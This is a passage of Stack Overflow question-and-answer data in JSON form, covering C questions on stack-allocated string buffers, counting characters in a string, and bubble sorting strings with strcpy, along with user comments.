"edited": false, "score": 2, "creation_date": 1449685803, "post_id": 34185799, "comment_id": 56118961, "body": "Bad code can <i>always</i> write past the end of the &quot;array&quot;, even if it&#39;s passed a structure with a length. Remember that the length of a C-string can still be calculated using <code>strlen</code>, not much different from using a pre-calculated length. Also, using your structure you must reinvent <i>all</i> string functions all over from the beginning, or at least wrap them with your own functions. I simply see no reasons for these Pascal-strings."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 3, "creation_date": 1449685958, "post_id": 34185799, "comment_id": 56119057, "body": "But to answer your question in the title, how to allocate dynamically on the stack, you could search for and read about the non-standard but common <code>alloca</code> function."}, {"owner": {"reputation": 814, "user_id": 5608223, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/040d9c81fc7a722b9f93cc492ab3a728?s=128&d=identicon&r=PG&f=1", "display_name": "N. Leavy", "link": "https://stackoverflow.com/users/5608223/n-leavy"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1449686199, "post_id": 34185799, "comment_id": 56119205, "body": "@Joachim: I wasn&#39;t trying to prevent against writing beyond the end of the buffer - as you point out there is nothing much you can do for that short of playing around with memory protection. I was trying to protect against the brain dead behaviour of strncpy not always null terminating a string."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449686658, "post_id": 34185799, "comment_id": 56119466, "body": "@N.Leavy: To protect against <code>strncpy</code> (I agree about its pitfalls), just write the terminator to the last entry int he array. No UB, no harm done."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1449686865, "post_id": 34185799, "comment_id": 56119600, "body": "@JoachimPileborg: If such strings are supported by a full-featured library and - possibly - the language itself, they are very well useful and often faster (no need to scan for the length). Still such buffers might be some niche application., but not useful for normal C strings. Hower, that would be useful for <code>malloc</code> &amp; co with a <i>flexible array member</i>."}, {"owner": {"reputation": 814, "user_id": 5608223, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/040d9c81fc7a722b9f93cc492ab3a728?s=128&d=identicon&r=PG&f=1", "display_name": "N. Leavy", "link": "https://stackoverflow.com/users/5608223/n-leavy"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1449697375, "post_id": 34185799, "comment_id": 56125406, "body": "@Joachim: I&#39;m not planning on using these to hold strings as such - but rather as a way to pass a string-buffer to a function. This way it can return a dynamic string without doing a <code>malloc</code> or using some sort of static buffer that wouldn&#39;t be thread safe."}], "answers": [{"comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1449686302, "post_id": 34186477, "comment_id": 56119261, "body": "Don&#39;t use double leading underscore in names, those are reserved in all scopes for the compiler and standard library."}, {"owner": {"reputation": 12119, "user_id": 5265292, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/0b9b1031971201aa02e13287af690946?s=128&d=identicon&r=PG&f=1", "display_name": "grek40", "link": "https://stackoverflow.com/users/5265292/grek40"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1449686416, "post_id": 34186477, "comment_id": 56119327, "body": "Ok, gonna rename it. Sometimes I&#39;m thinking to much in compiler terms while still playing in manual written code :)"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1449688270, "post_id": 34186477, "comment_id": 56120413, "body": "@ Joachim Pileborg Just to add, (because I wanted to know who is doing the reserving), &quot;... All identifiers that begin with an underscore and either an uppercase letter or another underscore are always reserved for any use....&quot; C11 &#167;7.1.3 1"}, {"owner": {"reputation": 12119, "user_id": 5265292, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/0b9b1031971201aa02e13287af690946?s=128&d=identicon&r=PG&f=1", "display_name": "grek40", "link": "https://stackoverflow.com/users/5265292/grek40"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1449688412, "post_id": 34186477, "comment_id": 56120479, "body": "@chux puh, close call... I nearly ended up using another reserved name, but fortunately the <code>_buffer...</code> starts lowercase"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1449688678, "post_id": 34186477, "comment_id": 56120612, "body": "Note:  the next line of the spec is &quot;All identifiers that begin with an underscore are always reserved for use as identifiers with file scope in both the ordinary and tag name spaces.&quot;  If I read that right <code>STRBUF(a, 10);</code> is ok in <code>main()</code>, but <i>maybe</i> a problem as a global. IDK."}, {"owner": {"reputation": 814, "user_id": 5608223, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/040d9c81fc7a722b9f93cc492ab3a728?s=128&d=identicon&r=PG&f=1", "display_name": "N. Leavy", "link": "https://stackoverflow.com/users/5608223/n-leavy"}, "edited": false, "score": 0, "creation_date": 1449697602, "post_id": 34186477, "comment_id": 56125535, "body": "I like this - much simpler than what I was doing. I was trying to keep it all in one structure which was definitely overcomplicated things."}], "tags": [], "owner": {"reputation": 12119, "user_id": 5265292, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/0b9b1031971201aa02e13287af690946?s=128&d=identicon&r=PG&f=1", "display_name": "grek40", "link": "https://stackoverflow.com/users/5265292/grek40"}, "is_accepted": true, "score": 1, "last_activity_date": 1449686431, "last_edit_date": 1449686431, "creation_date": 1449686166, "answer_id": 34186477, "question_id": 34185799, "link": "https://stackoverflow.com/questions/34185799/what-is-a-good-way-to-allocate-a-sized-string-buffer-on-the-stack/34186477#34186477", "title": "What is a good way to allocate a sized string buffer on the stack?", "body": "<p>I think you are already pretty close to a solution. Just keep a <code>char*</code> in your struct and allocate it via char-array. In order to have the save trailing zero at the end of string, just allocate an extra char additional to the size and initialize the whole array with zeroes.</p>\n\n<pre><code>typedef struct\n{\n    int length;\n    char* str;\n} strbuf_t;\n\n#define STRBUF(varname, size) \\\n    char _buffer_ ## varname[size + 1] = {'\\0'}; \\\n    strbuf_t varname = { size, _buffer_ ## varname }\n\nint main()\n{\n    STRBUF(a, 10);\n\n    strncpy(a.str, \"Hello, world!\", a.length);\n    printf(\"a.length = %d\\n\", a.length);\n    puts(a.str);\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 1, "last_activity_date": 1449692445, "creation_date": 1449692445, "answer_id": 34188239, "question_id": 34185799, "link": "https://stackoverflow.com/questions/34185799/what-is-a-good-way-to-allocate-a-sized-string-buffer-on-the-stack/34188239#34188239", "title": "What is a good way to allocate a sized string buffer on the stack?", "body": "<p>Perhaps the following.  Allocate the memory with an aligned VLA and then overlay.</p>\n\n<pre><code>typedef struct strbuf_t_ {\n    int  length;\n    char str[];\n} strbuf_t;\n\n#include &lt;stddef.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdalign.h&gt;\n\nint main(void) {\n  char *s = \"Hello\";\n\n  size_t length = strlen(s);\n  size_t n = sizeof (strbuf_t) + length + 1;\n  _Alignas(strbuf_t) unsigned char mem[n];\n\n  strbuf_t *xx = (strbuf_t*) mem;\n  xx-&gt;length = length;\n  memcpy(xx-&gt;str, s, n+1);\n\n  printf(\"int:%zu s:%zu n:%zu mem:%zu\\n\", \n      sizeof xx-&gt;length, sizeof (strbuf_t), n, sizeof mem);\n  return 0;\n}\n</code></pre>\n\n<p>Output</p>\n\n<pre><code>int:4 s:4 n:6 mem:10\n</code></pre>\n\n<p>Note: C99 allows the last <code>struct</code> member to have an indefinite array count of <code>[]</code></p>\n"}], "owner": {"reputation": 814, "user_id": 5608223, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/040d9c81fc7a722b9f93cc492ab3a728?s=128&d=identicon&r=PG&f=1", "display_name": "N. Leavy", "link": "https://stackoverflow.com/users/5608223/n-leavy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 161, "favorite_count": 1, "accepted_answer_id": 34186477, "answer_count": 2, "score": 3, "last_activity_date": 1449692445, "creation_date": 1449683956, "last_edit_date": 1449685091, "question_id": 34185799, "link": "https://stackoverflow.com/questions/34185799/what-is-a-good-way-to-allocate-a-sized-string-buffer-on-the-stack", "title": "What is a good way to allocate a sized string buffer on the stack?", "body": "<p>Using pure C (and the C-preprocessor) I would like to create a string buffer that includes a length parameter, so that I could pass it around easily and any functions that operate on it could do so without danger of writing past the end. This is simple enough:</p>\n\n<pre><code>typedef struct strbuf_t_ {\n    int  length;\n    char str[1];\n} strbuf_t;\n</code></pre>\n\n<p>but then if I want a small scratch space on the stack to format some output text, there is no trivial way to allocate a <code>strbuf_t</code> on the stack. What I would like is some clever macro that allows me to do:</p>\n\n<pre><code>STRBUF(10) foo;\nprintf(\"foo.length = %d\\n\", foo.length); // outputs: foo.length = 10\nstrncpy(foo.str, \"this is too long\", foo.length);\n</code></pre>\n\n<p>Unfortunately I don't seem to be able to do that. The best I've come up with is:</p>\n\n<pre><code>#define STRBUF(size, name) \\\n    struct {\\\n        strbuf_t buf;\\\n        char space[size - 1];\\\n        char zero;\\\n    } name ## _plus_space_ = { .buf={.length=size}, .space=\"\", .zero='\\0'};\\\n    strbuf_t *name = &amp;name ## _plus_space_.buf\n\nint main(void)\n{\n    STRBUF(10, a);\n\n    strncpy(a-&gt;str, \"Hello, world!\", a-&gt;length);\n    printf(\"a-&gt;length = %d\\n\", a-&gt;length); // outputs: a-&gt;length = 10\n    puts(a-&gt;str); // outputs: Hello, wor\n}\n</code></pre>\n\n<p>This meets all of the requirements I listed, but <code>a</code> is a pointer not the structure itself, and the allocation is certainly not intuitive.</p>\n\n<p>Has anyone come up with something better?</p>\n"}, {"tags": ["c", "string"], "comments": [{"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 4, "creation_date": 1449684056, "post_id": 34185771, "comment_id": 56117852, "body": "Why do you take input twice ? Remove <code>fgets</code> before <code>if</code> ."}, {"owner": {"reputation": 3723, "user_id": 1169091, "user_type": "registered", "accept_rate": 9, "profile_image": "https://i.stack.imgur.com/5vE4L.jpg?s=128&g=1", "display_name": "nicomp", "link": "https://stackoverflow.com/users/1169091/nicomp"}, "edited": false, "score": 1, "creation_date": 1449684108, "post_id": 34185771, "comment_id": 56117883, "body": "&quot;Weird&quot; is not precise. What is weird about it to you?"}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1449684237, "post_id": 34185771, "comment_id": 56117965, "body": "You should remove the new-line caracter with <code>strtok</code> directly after <code>fgets</code> if it succeeded. That will ensure that you use the truncated string thoughout and will make corrections such as printing <code>size - 1</code> unneccessary."}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1449684815, "post_id": 34185771, "comment_id": 56118323, "body": "What is the output you expect? Do you want to print &quot;The 1st char occurs 2x, the 2nd char occurs 1x&quot; when the input is &quot;eel&quot;?"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1449684974, "post_id": 34185771, "comment_id": 56118435, "body": "Although the code has many problems, it doesn&#39;t generate that output if you press (enter), type &quot;Hello&quot; and press (enter) again."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1449688515, "post_id": 34185771, "comment_id": 56120534, "body": "Also: Use <code>count[UCAHR_MAX+1];</code> and <code>count[(unsigned char)str[i]] += 1;</code>"}], "answers": [{"comments": [{"owner": {"reputation": 4232, "user_id": 5281962, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a29ae5ecb74bea23afa60d940edc0282?s=128&d=identicon&r=PG&f=1", "display_name": "Cherubim", "link": "https://stackoverflow.com/users/5281962/cherubim"}, "edited": false, "score": 1, "creation_date": 1449684256, "post_id": 34185841, "comment_id": 56117974, "body": "I think OP meant to print index number of the character and moreover he declared i as int"}, {"owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "reply_to_user": {"reputation": 4232, "user_id": 5281962, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a29ae5ecb74bea23afa60d940edc0282?s=128&d=identicon&r=PG&f=1", "display_name": "Cherubim", "link": "https://stackoverflow.com/users/5281962/cherubim"}, "edited": false, "score": 0, "creation_date": 1449684420, "post_id": 34185841, "comment_id": 56118075, "body": "@ch3rub7 That&#39;s correct, he did declare <code>i</code> as <code>int</code>. However, his program interprets <code>i</code> as a character code when it indexes into <code>count</code>, so it&#39;s fine to pass <code>i</code> to <code>%c</code>."}], "tags": [], "owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "is_accepted": false, "score": 0, "last_activity_date": 1449684354, "last_edit_date": 1449684354, "creation_date": 1449684107, "answer_id": 34185841, "question_id": 34185771, "link": "https://stackoverflow.com/questions/34185771/count-the-number-of-characters-in-a-string/34185841#34185841", "title": "count the number of characters in a string", "body": "<p>The reason your output is \"weird\" is that you are using <code>%d</code> to print character <em>code</em>, instead of <code>%c</code> to print the character itself:</p>\n\n<pre><code>printf(\"The '%c' (code:%d) character has %d occurrences.\\n\", i, i, count[i]);\n</code></pre>\n\n<p><a href=\"http://ideone.com/UdYPRn\" rel=\"nofollow\">Demo</a></p>\n\n<pre><code>The 'e' (code:101) character has 1 occurrences.\nThe 'h' (code:104) character has 1 occurrences.\nThe 'l' (code:108) character has 2 occurrences.\nThe 'o' (code:111) character has 1 occurrences.\n'hello' is 5 characters long\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 18759, "user_id": 2226988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c6fbec3a71b2e95e4a6e41478deb379?s=128&d=identicon&r=PG", "display_name": "Tom Blodget", "link": "https://stackoverflow.com/users/2226988/tom-blodget"}, "edited": false, "score": 0, "creation_date": 1449714227, "post_id": 34185895, "comment_id": 56131621, "body": "I think it is a bad idea to teach people ASCII. Beyond specialized hardware devices, ASCII is seldom used. The character set and encoding used is extremely important. That almost all the currently used character sets include all of ASCII&#39;s characters and most encode them the same just leads people to falsely confirm they are using ASCII. Sure beginners can stick the <a href=\"https://en.wikipedia.org/wiki/Basic_Latin_(Unicode_block)\" rel=\"nofollow noreferrer\">C0 Controls and Basic Latin</a> characters and assume they are using an encoding that is compatible with UTF-8 but they shouldn&#39;t come away thinking they are using ASCII."}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": false, "score": 1, "last_activity_date": 1449685299, "last_edit_date": 1449685299, "creation_date": 1449684312, "answer_id": 34185895, "question_id": 34185771, "link": "https://stackoverflow.com/questions/34185771/count-the-number-of-characters-in-a-string/34185895#34185895", "title": "count the number of characters in a string", "body": "<p>You are using the current encoding for the index in <code>count</code>. If your encoding is <a href=\"http://en.cppreference.com/w/c/language/ascii\" rel=\"nofollow\">ASCII</a> (the most common encoding) then the character <code>'H'</code> has the value <code>72</code> so you will increase <code>count[72]</code> and and when you print your output you will print it as the 72:th character.</p>\n\n<p>Instead use the loop variable as the counter, and then use the character in <code>str[i]</code> as the index into the counter array.</p>\n\n<p>Something like this</p>\n\n<pre><code>for (size_t i = 0; i &lt; strlen(str); ++i)\n{\n    if (isprint(str[i])\n    {\n        printf(\"Character #%zu is '%c' and the count is %d\\n\",\n               i + 1, str[i], count[str[i]]);\n    }\n    else\n    {\n        printf(\"Character #%zu is 0x%02hhx and the count is %d\\n\",\n               i + 1, str[i], count[str[i]]);\n    }\n}\n</code></pre>\n\n<p>By the way, be careful with the input from <a href=\"http://en.cppreference.com/w/c/io/fgets\" rel=\"nofollow\"><code>fgets</code></a>, it will most likely leave the newline at the end of the string, and you will count that too. I handled in the code above by using <a href=\"http://en.cppreference.com/w/c/string/byte/isprint\" rel=\"nofollow\"><code>isprint</code></a> to see if the character is \"printable\" or not.</p>\n\n<p>Also, and more importantly, as you use the character encoding as index in the <code>count</code> array, you need as many elements in it as there are characters in the encoding. With <a href=\"http://en.cppreference.com/w/c/language/ascii\" rel=\"nofollow\">ASCII encoding</a> (the most common and likely what you are using) you need 128 elements to count all possible characters in the <a href=\"http://en.cppreference.com/w/c/language/ascii\" rel=\"nofollow\">ASCII table</a> (not counting \"extended ASCII\"). So you need to declare your <code>count</code> array with 128 elements. If you don't, then you risk indexing the <code>count</code> array out of bounds, and have <em>undefined behavior</em>.</p>\n"}], "owner": {"reputation": 3686, "user_id": 2902996, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/zogMf.png?s=128&g=1", "display_name": "Joel", "link": "https://stackoverflow.com/users/2902996/joel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 75, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1449685299, "creation_date": 1449683894, "question_id": 34185771, "link": "https://stackoverflow.com/questions/34185771/count-the-number-of-characters-in-a-string", "title": "count the number of characters in a string", "body": "<p>I'm trying to count the amount of times a character is repeated in a string( can be multiple words ), however, right now i think i'm pretty close to the result but my output is a bit weird:</p>\n\n<p>CODE:</p>\n\n<pre><code>int statistics(){\n  char str[122];\n  int i=0;\n  int count[122] = { 0 };\n  printf(\"Enter a string: \");\n  fgets(str,sizeof str, stdin);\n  if(fgets(str,sizeof str, stdin) == NULL){\n     printf(\"error\");\n  }\n  size_t size = strlen(str);\n\n  for(int i = 0; i &lt; size; i++) {\n      count[(int)str[i]] += 1;\n}\n\nfor (i = 0; i &lt; 122; i++) {\n    if(count[i]&gt;=1){\n    printf(\"The %d. character has %d occurrences.\\n\", i, count[i]);\n    }\n  }\n  strtok(str,\"\\n\");\n  printf(\"'%s' is %lu characters long\\n\",str,size-1);\n}\n</code></pre>\n\n<p>eg input: hello</p>\n\n<p>outputs:</p>\n\n<pre><code>The 107. character has 1 occurences.\nThe 198. character has 1 occurences.\nThe 201. character has 1 occurences.\nThe 205. character has 1 occurences.\nThe 208. character has 1 occurences.\n'Hello' is 5 characters long\n</code></pre>\n"}, {"tags": ["c", "arrays", "sorting"], "comments": [{"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1449683009, "post_id": 34185368, "comment_id": 56117163, "body": "change to <code>char *tmp = drivers[i]; drivers[i] = drivers[j]; drivers[j] = tmp;</code>"}, {"owner": {"reputation": 59348, "user_id": 522663, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/OKOEw.png?s=128&g=1", "display_name": "Jonathan Wood", "link": "https://stackoverflow.com/users/522663/jonathan-wood"}, "edited": false, "score": 1, "creation_date": 1449683069, "post_id": 34185368, "comment_id": 56117204, "body": "There should be no need to use <code>strcpy</code> here. Just shuffle around the pointers to your strings."}, {"owner": {"reputation": 305833, "user_id": 68587, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/7d9fd158e03cbde94f7e0b33b78222af?s=128&d=identicon&r=PG", "display_name": "John Kugelman", "link": "https://stackoverflow.com/users/68587/john-kugelman"}, "edited": false, "score": 2, "creation_date": 1449683138, "post_id": 34185368, "comment_id": 56117252, "body": "How does this even compile? <code>#define maks 10;</code> should not have a semi-colon."}, {"owner": {"reputation": 31, "user_id": 5441129, "user_type": "registered", "profile_image": "https://graph.facebook.com/10205235204339939/picture?type=large", "display_name": "Coralina", "link": "https://stackoverflow.com/users/5441129/coralina"}, "edited": false, "score": 0, "creation_date": 1449683283, "post_id": 34185368, "comment_id": 56117348, "body": "define maks 10 it was my error, there is no colon"}], "answers": [{"tags": [], "owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "is_accepted": true, "score": 3, "last_activity_date": 1449683589, "last_edit_date": 1449683589, "creation_date": 1449683152, "answer_id": 34185518, "question_id": 34185368, "link": "https://stackoverflow.com/questions/34185368/bubble-sorting-with-strcpy/34185518#34185518", "title": "Bubble sorting with strcpy", "body": "<p>You have declared and initialized like this -</p>\n\n<pre><code>char* drivers[10]={\"Mark\", \"Jacob\", \"Andre\", \"Thomas\", \"Hellboy\"};\n</code></pre>\n\n<p><code>drivers[0]</code> ,<code>drivers[1]</code> are string literals (<em>constants -should not be modified</em> ) and in function you try to modify them with <code>strcpy</code> ,therefore this problem-</p>\n\n<pre><code>strcpy(drivers[i], drivers[j]);\nstrcpy(drivers[j], tmp);\n</code></pre>\n\n<p>You can just assign pointers to each other -</p>\n\n<pre><code>char *tmp;                 // declare char * not char [] \n...\ntmp=drivers[i];\ndrivers[i]=drivers[j];\ndrivers[j]=drivers[i];\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 47569, "user_id": 3255455, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5993e7ece129141878cd6419d39cc26e?s=128&d=identicon&r=PG&f=1", "display_name": "gnasher729", "link": "https://stackoverflow.com/users/3255455/gnasher729"}, "is_accepted": false, "score": 3, "last_activity_date": 1449683342, "creation_date": 1449683342, "answer_id": 34185589, "question_id": 34185368, "link": "https://stackoverflow.com/questions/34185368/bubble-sorting-with-strcpy/34185589#34185589", "title": "Bubble sorting with strcpy", "body": "<p>drivers is an array with ten elements. The elements of \"drivers\" are pointers. They point to small nameless static arrays, for example \"Mark\" points to an array with five chars M, a, r, k, and \\0. </p>\n\n<p>You can just exchange these pointers. </p>\n\n<p>What you are trying with strcpy: For example, \"Mark\" is a pointer to an array with five chars, \"Jacob\" is a pointer to an array of six chars. You can't exchange the cars with strcpy, because \"Jacob\" doesn't fit where \"Mark\" is stored. And moreover, these arrays are likely read-only, so even if everything had the same length, any attempt to change these arrays would crash. </p>\n"}], "owner": {"reputation": 31, "user_id": 5441129, "user_type": "registered", "profile_image": "https://graph.facebook.com/10205235204339939/picture?type=large", "display_name": "Coralina", "link": "https://stackoverflow.com/users/5441129/coralina"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 412, "favorite_count": 0, "accepted_answer_id": 34185518, "answer_count": 2, "score": 1, "last_activity_date": 1449683589, "creation_date": 1449682672, "last_edit_date": 1449683109, "question_id": 34185368, "link": "https://stackoverflow.com/questions/34185368/bubble-sorting-with-strcpy", "title": "Bubble sorting with strcpy", "body": "<p>So I have an an example <code>array</code>:</p>\n\n<pre><code>char* drivers[10] = {\"Mark\", \"Jacob\", \"Andre\", \"Thomas\", \"Hellboy\"};\n</code></pre>\n\n<p>And an <code>srand</code> function that generates random \"Lap times\" for each driver and stores the laptime to an <code>array</code>:</p>\n\n<pre><code>float lap_time[10];\n</code></pre>\n\n<p>I need to sort them respectively to get the \"Top 1\" and \"Last 1\", I'm thinking of bubble sort but it doesn't seem to work like it should. It generates an error. Bus fault or something similar. If I remove the <code>strcpy()</code> part, it works just as fine. But something somewhere related to <code>strcpy()</code> has an error.</p>\n\n<p>This is just the sorting function, everything else works perfectly. When <code>strcpy()</code> is added with <code>char tmp[]</code> array then this function crashes.</p>\n\n<p><code>printf()</code> for this function works. Just problem with getting my <code>strcpy()</code> to work.</p>\n\n<p>Sorting:</p>\n\n<pre><code>#define maks 10; \n\nint Fastestdriver(char* drivers[], float lap_times[], char tmp[maks])\n{\n    int i, j, a;\n\n    for (i = 0; i &lt; 10; ++i)\n    {\n        for (j = i+1 ; j &lt; 10 ; ++j)\n        {\n            if (lap_time[i] &lt; lap_time[j])\n            {\n                a =  lap_time[i];\n                lap_time[i] = lap_time[j];\n                lap_time[j] = a;\n                strcpy(tmp, drivers[i]);\n                strcpy(drivers[i], drivers[j]);\n                strcpy(drivers[j], tmp);\n\n            }\n        }\n    }\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "pointers", "undefined", "dereference"], "comments": [{"owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "edited": false, "score": 0, "creation_date": 1449682508, "post_id": 34185252, "comment_id": 56116877, "body": "What&#39;s assigned to <code>Parque</code>?"}, {"owner": {"reputation": 619, "user_id": 1666733, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d588c62cff899e45a7d9fe926b1a0c63?s=128&d=identicon&r=PG", "display_name": "arduic", "link": "https://stackoverflow.com/users/1666733/arduic"}, "edited": false, "score": 0, "creation_date": 1449682565, "post_id": 34185252, "comment_id": 56116917, "body": "I think Parque is some kind of struct but I would like to see the definition of that first."}, {"owner": {"reputation": 109, "user_id": 4744792, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e5471902b81d07ea0bd4a1253a2f4455?s=128&d=identicon&r=PG&f=1", "display_name": "Rui Loureiro", "link": "https://stackoverflow.com/users/4744792/rui-loureiro"}, "reply_to_user": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "edited": false, "score": 0, "creation_date": 1449683095, "post_id": 34185252, "comment_id": 56117223, "body": "Oh I&#39;m sorry, I forgot to post its definition. @dasblinkenlight"}, {"owner": {"reputation": 109, "user_id": 4744792, 